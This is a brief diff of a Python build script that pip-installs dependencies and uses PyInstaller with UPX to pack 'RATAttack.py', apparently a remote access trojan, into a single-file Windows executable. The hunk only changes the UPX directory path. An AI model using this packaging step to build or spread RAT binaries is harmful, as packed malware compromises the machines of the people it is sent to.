@@ -75,7 +75,7 @@ system('pip install ' + fileB)
 if not auto:
     input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')
 
-system('pyinstaller --clean --upxdir upx395w --onefile "RATAttack.py"')
+system('pyinstaller --clean --upxdir upx-* --onefile "RATAttack.py"')
 
 if exists('dist/RATAttack.exe'):
     print('\n\nScript has finished')
